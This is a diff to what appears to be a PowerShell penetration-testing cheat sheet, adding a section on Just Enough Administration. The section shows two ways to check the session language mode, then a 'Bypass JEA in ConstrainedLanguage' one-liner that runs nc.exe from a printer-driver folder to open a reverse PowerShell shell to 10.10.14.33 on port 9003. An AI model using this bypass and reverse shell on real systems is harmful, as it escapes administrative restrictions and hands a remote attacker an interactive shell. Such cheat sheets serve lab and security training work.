@@ -299,7 +299,20 @@ static void Main(string[] args){
 ```
 
 ### Just Enough Administration
-  
+
+show current languages level :
+```powershell
+# METHOD 1
+(Get-PSSessionConfiguration -Name Test).LanguageMode
+# METHOD 2
+$ExecutionContext.SessionState.LanguageMode # use property
+```
+
+Bypass JEA in ConstrainedLanguage :
+```powershell
+{ C:\Windows\System32\spool\drivers\color\nc.exe -e powershell.exe 10.10.14.33 9003 }
+```
+
 ### ExecutionPolicy
 
 ```powershell
